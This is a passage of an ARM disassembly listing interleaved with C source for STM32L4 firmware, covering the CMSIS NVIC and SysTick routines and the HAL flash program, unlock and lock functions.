 8001138:	f7ff ffde 	bl	80010f8 <HAL_GetTick>
 800113c:	4602      	mov	r2, r0
 800113e:	68bb      	ldr	r3, [r7, #8]
 8001140:	1ad3      	subs	r3, r2, r3
 8001142:	68fa      	ldr	r2, [r7, #12]
 8001144:	429a      	cmp	r2, r3
 8001146:	d8f7      	bhi.n	8001138 <HAL_Delay+0x28>
  {
  }
}
 8001148:	bf00      	nop
 800114a:	bf00      	nop
 800114c:	3710      	adds	r7, #16
 800114e:	46bd      	mov	sp, r7
 8001150:	bd80      	pop	{r7, pc}
 8001152:	bf00      	nop
 8001154:	20000008 	.word	0x20000008

08001158 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001158:	b480      	push	{r7}
 800115a:	b085      	sub	sp, #20
 800115c:	af00      	add	r7, sp, #0
 800115e:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 8001160:	687b      	ldr	r3, [r7, #4]
 8001162:	f003 0307 	and.w	r3, r3, #7
 8001166:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001168:	4b0c      	ldr	r3, [pc, #48]	; (800119c <__NVIC_SetPriorityGrouping+0x44>)
 800116a:	68db      	ldr	r3, [r3, #12]
 800116c:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800116e:	68ba      	ldr	r2, [r7, #8]
 8001170:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001174:	4013      	ands	r3, r2
 8001176:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001178:	68fb      	ldr	r3, [r7, #12]
 800117a:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 800117c:	68bb      	ldr	r3, [r7, #8]
 800117e:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001180:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001184:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001188:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 800118a:	4a04      	ldr	r2, [pc, #16]	; (800119c <__NVIC_SetPriorityGrouping+0x44>)
 800118c:	68bb      	ldr	r3, [r7, #8]
 800118e:	60d3      	str	r3, [r2, #12]
}
 8001190:	bf00      	nop
 8001192:	3714      	adds	r7, #20
 8001194:	46bd      	mov	sp, r7
 8001196:	f85d 7b04 	ldr.w	r7, [sp], #4
 800119a:	4770      	bx	lr
 800119c:	e000ed00 	.word	0xe000ed00

080011a0 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 80011a0:	b480      	push	{r7}
 80011a2:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 80011a4:	4b04      	ldr	r3, [pc, #16]	; (80011b8 <__NVIC_GetPriorityGrouping+0x18>)
 80011a6:	68db      	ldr	r3, [r3, #12]
 80011a8:	0a1b      	lsrs	r3, r3, #8
 80011aa:	f003 0307 	and.w	r3, r3, #7
}
 80011ae:	4618      	mov	r0, r3
 80011b0:	46bd      	mov	sp, r7
 80011b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011b6:	4770      	bx	lr
 80011b8:	e000ed00 	.word	0xe000ed00

080011bc <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80011bc:	b480      	push	{r7}
 80011be:	b083      	sub	sp, #12
 80011c0:	af00      	add	r7, sp, #0
 80011c2:	4603      	mov	r3, r0
 80011c4:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80011c6:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80011ca:	2b00      	cmp	r3, #0
 80011cc:	db0b      	blt.n	80011e6 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 80011ce:	79fb      	ldrb	r3, [r7, #7]
 80011d0:	f003 021f 	and.w	r2, r3, #31
 80011d4:	4907      	ldr	r1, [pc, #28]	; (80011f4 <__NVIC_EnableIRQ+0x38>)
 80011d6:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80011da:	095b      	lsrs	r3, r3, #5
 80011dc:	2001      	movs	r0, #1
 80011de:	fa00 f202 	lsl.w	r2, r0, r2
 80011e2:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 80011e6:	bf00      	nop
 80011e8:	370c      	adds	r7, #12
 80011ea:	46bd      	mov	sp, r7
 80011ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011f0:	4770      	bx	lr
 80011f2:	bf00      	nop
 80011f4:	e000e100 	.word	0xe000e100

080011f8 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 80011f8:	b480      	push	{r7}
 80011fa:	b083      	sub	sp, #12
 80011fc:	af00      	add	r7, sp, #0
 80011fe:	4603      	mov	r3, r0
 8001200:	6039      	str	r1, [r7, #0]
 8001202:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001204:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001208:	2b00      	cmp	r3, #0
 800120a:	db0a      	blt.n	8001222 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800120c:	683b      	ldr	r3, [r7, #0]
 800120e:	b2da      	uxtb	r2, r3
 8001210:	490c      	ldr	r1, [pc, #48]	; (8001244 <__NVIC_SetPriority+0x4c>)
 8001212:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001216:	0112      	lsls	r2, r2, #4
 8001218:	b2d2      	uxtb	r2, r2
 800121a:	440b      	add	r3, r1
 800121c:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 8001220:	e00a      	b.n	8001238 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001222:	683b      	ldr	r3, [r7, #0]
 8001224:	b2da      	uxtb	r2, r3
 8001226:	4908      	ldr	r1, [pc, #32]	; (8001248 <__NVIC_SetPriority+0x50>)
 8001228:	79fb      	ldrb	r3, [r7, #7]
 800122a:	f003 030f 	and.w	r3, r3, #15
 800122e:	3b04      	subs	r3, #4
 8001230:	0112      	lsls	r2, r2, #4
 8001232:	b2d2      	uxtb	r2, r2
 8001234:	440b      	add	r3, r1
 8001236:	761a      	strb	r2, [r3, #24]
}
 8001238:	bf00      	nop
 800123a:	370c      	adds	r7, #12
 800123c:	46bd      	mov	sp, r7
 800123e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001242:	4770      	bx	lr
 8001244:	e000e100 	.word	0xe000e100
 8001248:	e000ed00 	.word	0xe000ed00

0800124c <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800124c:	b480      	push	{r7}
 800124e:	b089      	sub	sp, #36	; 0x24
 8001250:	af00      	add	r7, sp, #0
 8001252:	60f8      	str	r0, [r7, #12]
 8001254:	60b9      	str	r1, [r7, #8]
 8001256:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001258:	68fb      	ldr	r3, [r7, #12]
 800125a:	f003 0307 	and.w	r3, r3, #7
 800125e:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8001260:	69fb      	ldr	r3, [r7, #28]
 8001262:	f1c3 0307 	rsb	r3, r3, #7
 8001266:	2b04      	cmp	r3, #4
 8001268:	bf28      	it	cs
 800126a:	2304      	movcs	r3, #4
 800126c:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800126e:	69fb      	ldr	r3, [r7, #28]
 8001270:	3304      	adds	r3, #4
 8001272:	2b06      	cmp	r3, #6
 8001274:	d902      	bls.n	800127c <NVIC_EncodePriority+0x30>
 8001276:	69fb      	ldr	r3, [r7, #28]
 8001278:	3b03      	subs	r3, #3
 800127a:	e000      	b.n	800127e <NVIC_EncodePriority+0x32>
 800127c:	2300      	movs	r3, #0
 800127e:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001280:	f04f 32ff 	mov.w	r2, #4294967295
 8001284:	69bb      	ldr	r3, [r7, #24]
 8001286:	fa02 f303 	lsl.w	r3, r2, r3
 800128a:	43da      	mvns	r2, r3
 800128c:	68bb      	ldr	r3, [r7, #8]
 800128e:	401a      	ands	r2, r3
 8001290:	697b      	ldr	r3, [r7, #20]
 8001292:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001294:	f04f 31ff 	mov.w	r1, #4294967295
 8001298:	697b      	ldr	r3, [r7, #20]
 800129a:	fa01 f303 	lsl.w	r3, r1, r3
 800129e:	43d9      	mvns	r1, r3
 80012a0:	687b      	ldr	r3, [r7, #4]
 80012a2:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80012a4:	4313      	orrs	r3, r2
         );
}
 80012a6:	4618      	mov	r0, r3
 80012a8:	3724      	adds	r7, #36	; 0x24
 80012aa:	46bd      	mov	sp, r7
 80012ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012b0:	4770      	bx	lr
	...

080012b4 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 80012b4:	b580      	push	{r7, lr}
 80012b6:	b082      	sub	sp, #8
 80012b8:	af00      	add	r7, sp, #0
 80012ba:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80012bc:	687b      	ldr	r3, [r7, #4]
 80012be:	3b01      	subs	r3, #1
 80012c0:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 80012c4:	d301      	bcc.n	80012ca <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 80012c6:	2301      	movs	r3, #1
 80012c8:	e00f      	b.n	80012ea <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80012ca:	4a0a      	ldr	r2, [pc, #40]	; (80012f4 <SysTick_Config+0x40>)
 80012cc:	687b      	ldr	r3, [r7, #4]
 80012ce:	3b01      	subs	r3, #1
 80012d0:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 80012d2:	210f      	movs	r1, #15
 80012d4:	f04f 30ff 	mov.w	r0, #4294967295
 80012d8:	f7ff ff8e 	bl	80011f8 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80012dc:	4b05      	ldr	r3, [pc, #20]	; (80012f4 <SysTick_Config+0x40>)
 80012de:	2200      	movs	r2, #0
 80012e0:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80012e2:	4b04      	ldr	r3, [pc, #16]	; (80012f4 <SysTick_Config+0x40>)
 80012e4:	2207      	movs	r2, #7
 80012e6:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 80012e8:	2300      	movs	r3, #0
}
 80012ea:	4618      	mov	r0, r3
 80012ec:	3708      	adds	r7, #8
 80012ee:	46bd      	mov	sp, r7
 80012f0:	bd80      	pop	{r7, pc}
 80012f2:	bf00      	nop
 80012f4:	e000e010 	.word	0xe000e010

080012f8 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80012f8:	b580      	push	{r7, lr}
 80012fa:	b082      	sub	sp, #8
 80012fc:	af00      	add	r7, sp, #0
 80012fe:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001300:	6878      	ldr	r0, [r7, #4]
 8001302:	f7ff ff29 	bl	8001158 <__NVIC_SetPriorityGrouping>
}
 8001306:	bf00      	nop
 8001308:	3708      	adds	r7, #8
 800130a:	46bd      	mov	sp, r7
 800130c:	bd80      	pop	{r7, pc}

0800130e <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800130e:	b580      	push	{r7, lr}
 8001310:	b086      	sub	sp, #24
 8001312:	af00      	add	r7, sp, #0
 8001314:	4603      	mov	r3, r0
 8001316:	60b9      	str	r1, [r7, #8]
 8001318:	607a      	str	r2, [r7, #4]
 800131a:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 800131c:	2300      	movs	r3, #0
 800131e:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 8001320:	f7ff ff3e 	bl	80011a0 <__NVIC_GetPriorityGrouping>
 8001324:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 8001326:	687a      	ldr	r2, [r7, #4]
 8001328:	68b9      	ldr	r1, [r7, #8]
 800132a:	6978      	ldr	r0, [r7, #20]
 800132c:	f7ff ff8e 	bl	800124c <NVIC_EncodePriority>
 8001330:	4602      	mov	r2, r0
 8001332:	f997 300f 	ldrsb.w	r3, [r7, #15]
 8001336:	4611      	mov	r1, r2
 8001338:	4618      	mov	r0, r3
 800133a:	f7ff ff5d 	bl	80011f8 <__NVIC_SetPriority>
}
 800133e:	bf00      	nop
 8001340:	3718      	adds	r7, #24
 8001342:	46bd      	mov	sp, r7
 8001344:	bd80      	pop	{r7, pc}

08001346 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001346:	b580      	push	{r7, lr}
 8001348:	b082      	sub	sp, #8
 800134a:	af00      	add	r7, sp, #0
 800134c:	4603      	mov	r3, r0
 800134e:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 8001350:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001354:	4618      	mov	r0, r3
 8001356:	f7ff ff31 	bl	80011bc <__NVIC_EnableIRQ>
}
 800135a:	bf00      	nop
 800135c:	3708      	adds	r7, #8
 800135e:	46bd      	mov	sp, r7
 8001360:	bd80      	pop	{r7, pc}

08001362 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 8001362:	b580      	push	{r7, lr}
 8001364:	b082      	sub	sp, #8
 8001366:	af00      	add	r7, sp, #0
 8001368:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 800136a:	6878      	ldr	r0, [r7, #4]
 800136c:	f7ff ffa2 	bl	80012b4 <SysTick_Config>
 8001370:	4603      	mov	r3, r0
}
 8001372:	4618      	mov	r0, r3
 8001374:	3708      	adds	r7, #8
 8001376:	46bd      	mov	sp, r7
 8001378:	bd80      	pop	{r7, pc}
	...

0800137c <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 800137c:	b580      	push	{r7, lr}
 800137e:	b086      	sub	sp, #24
 8001380:	af00      	add	r7, sp, #0
 8001382:	60f8      	str	r0, [r7, #12]
 8001384:	60b9      	str	r1, [r7, #8]
 8001386:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 800138a:	2300      	movs	r3, #0
 800138c:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800138e:	4b2f      	ldr	r3, [pc, #188]	; (800144c <HAL_FLASH_Program+0xd0>)
 8001390:	781b      	ldrb	r3, [r3, #0]
 8001392:	2b01      	cmp	r3, #1
 8001394:	d101      	bne.n	800139a <HAL_FLASH_Program+0x1e>
 8001396:	2302      	movs	r3, #2
 8001398:	e053      	b.n	8001442 <HAL_FLASH_Program+0xc6>
 800139a:	4b2c      	ldr	r3, [pc, #176]	; (800144c <HAL_FLASH_Program+0xd0>)
 800139c:	2201      	movs	r2, #1
 800139e:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80013a0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80013a4:	f000 f888 	bl	80014b8 <FLASH_WaitForLastOperation>
 80013a8:	4603      	mov	r3, r0
 80013aa:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 80013ac:	7dfb      	ldrb	r3, [r7, #23]
 80013ae:	2b00      	cmp	r3, #0
 80013b0:	d143      	bne.n	800143a <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80013b2:	4b26      	ldr	r3, [pc, #152]	; (800144c <HAL_FLASH_Program+0xd0>)
 80013b4:	2200      	movs	r2, #0
 80013b6:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80013b8:	4b25      	ldr	r3, [pc, #148]	; (8001450 <HAL_FLASH_Program+0xd4>)
 80013ba:	681b      	ldr	r3, [r3, #0]
 80013bc:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80013c0:	2b00      	cmp	r3, #0
 80013c2:	d009      	beq.n	80013d8 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80013c4:	4b22      	ldr	r3, [pc, #136]	; (8001450 <HAL_FLASH_Program+0xd4>)
 80013c6:	681b      	ldr	r3, [r3, #0]
 80013c8:	4a21      	ldr	r2, [pc, #132]	; (8001450 <HAL_FLASH_Program+0xd4>)
 80013ca:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80013ce:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80013d0:	4b1e      	ldr	r3, [pc, #120]	; (800144c <HAL_FLASH_Program+0xd0>)
 80013d2:	2202      	movs	r2, #2
 80013d4:	771a      	strb	r2, [r3, #28]
 80013d6:	e002      	b.n	80013de <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80013d8:	4b1c      	ldr	r3, [pc, #112]	; (800144c <HAL_FLASH_Program+0xd0>)
 80013da:	2200      	movs	r2, #0
 80013dc:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 80013de:	68fb      	ldr	r3, [r7, #12]
 80013e0:	2b00      	cmp	r3, #0
 80013e2:	d107      	bne.n	80013f4 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 80013e4:	e9d7 2300 	ldrd	r2, r3, [r7]
 80013e8:	68b8      	ldr	r0, [r7, #8]
 80013ea:	f000 f8bd 	bl	8001568 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 80013ee:	2301      	movs	r3, #1
 80013f0:	613b      	str	r3, [r7, #16]
 80013f2:	e010      	b.n	8001416 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 80013f4:	68fb      	ldr	r3, [r7, #12]
 80013f6:	2b01      	cmp	r3, #1
 80013f8:	d002      	beq.n	8001400 <HAL_FLASH_Program+0x84>
 80013fa:	68fb      	ldr	r3, [r7, #12]
 80013fc:	2b02      	cmp	r3, #2
 80013fe:	d10a      	bne.n	8001416 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001400:	683b      	ldr	r3, [r7, #0]
 8001402:	4619      	mov	r1, r3
 8001404:	68b8      	ldr	r0, [r7, #8]
 8001406:	f000 f8d5 	bl	80015b4 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800140a:	68fb      	ldr	r3, [r7, #12]
 800140c:	2b02      	cmp	r3, #2
 800140e:	d102      	bne.n	8001416 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001410:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001414:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001416:	f24c 3050 	movw	r0, #50000	; 0xc350
 800141a:	f000 f84d 	bl	80014b8 <FLASH_WaitForLastOperation>
 800141e:	4603      	mov	r3, r0
 8001420:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 8001422:	693b      	ldr	r3, [r7, #16]
 8001424:	2b00      	cmp	r3, #0
 8001426:	d006      	beq.n	8001436 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 8001428:	4b09      	ldr	r3, [pc, #36]	; (8001450 <HAL_FLASH_Program+0xd4>)
 800142a:	695a      	ldr	r2, [r3, #20]
 800142c:	693b      	ldr	r3, [r7, #16]
 800142e:	43db      	mvns	r3, r3
 8001430:	4907      	ldr	r1, [pc, #28]	; (8001450 <HAL_FLASH_Program+0xd4>)
 8001432:	4013      	ands	r3, r2
 8001434:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001436:	f000 f9cf 	bl	80017d8 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 800143a:	4b04      	ldr	r3, [pc, #16]	; (800144c <HAL_FLASH_Program+0xd0>)
 800143c:	2200      	movs	r2, #0
 800143e:	701a      	strb	r2, [r3, #0]

  return status;
 8001440:	7dfb      	ldrb	r3, [r7, #23]
}
 8001442:	4618      	mov	r0, r3
 8001444:	3718      	adds	r7, #24
 8001446:	46bd      	mov	sp, r7
 8001448:	bd80      	pop	{r7, pc}
 800144a:	bf00      	nop
 800144c:	2000000c 	.word	0x2000000c
 8001450:	40022000 	.word	0x40022000

08001454 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001454:	b480      	push	{r7}
 8001456:	b083      	sub	sp, #12
 8001458:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 800145a:	2300      	movs	r3, #0
 800145c:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800145e:	4b0b      	ldr	r3, [pc, #44]	; (800148c <HAL_FLASH_Unlock+0x38>)
 8001460:	695b      	ldr	r3, [r3, #20]
 8001462:	2b00      	cmp	r3, #0
 8001464:	da0b      	bge.n	800147e <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 8001466:	4b09      	ldr	r3, [pc, #36]	; (800148c <HAL_FLASH_Unlock+0x38>)
 8001468:	4a09      	ldr	r2, [pc, #36]	; (8001490 <HAL_FLASH_Unlock+0x3c>)
 800146a:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 800146c:	4b07      	ldr	r3, [pc, #28]	; (800148c <HAL_FLASH_Unlock+0x38>)
 800146e:	4a09      	ldr	r2, [pc, #36]	; (8001494 <HAL_FLASH_Unlock+0x40>)
 8001470:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 8001472:	4b06      	ldr	r3, [pc, #24]	; (800148c <HAL_FLASH_Unlock+0x38>)
 8001474:	695b      	ldr	r3, [r3, #20]
 8001476:	2b00      	cmp	r3, #0
 8001478:	da01      	bge.n	800147e <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 800147a:	2301      	movs	r3, #1
 800147c:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800147e:	79fb      	ldrb	r3, [r7, #7]
}
 8001480:	4618      	mov	r0, r3
 8001482:	370c      	adds	r7, #12
 8001484:	46bd      	mov	sp, r7
 8001486:	f85d 7b04 	ldr.w	r7, [sp], #4
 800148a:	4770      	bx	lr
 800148c:	40022000 	.word	0x40022000
 8001490:	45670123 	.word	0x45670123
 8001494:	cdef89ab 	.word	0xcdef89ab

08001498 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001498:	b480      	push	{r7}
 800149a:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 800149c:	4b05      	ldr	r3, [pc, #20]	; (80014b4 <HAL_FLASH_Lock+0x1c>)
 800149e:	695b      	ldr	r3, [r3, #20]
 80014a0:	4a04      	ldr	r2, [pc, #16]	; (80014b4 <HAL_FLASH_Lock+0x1c>)
 80014a2:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 80014a6:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 80014a8:	2300      	movs	r3, #0
}
 80014aa:	4618      	mov	r0, r3
 80014ac:	46bd      	mov	sp, r7
 80014ae:	f85d 7b04 	ldr.w	r7, [sp], #4
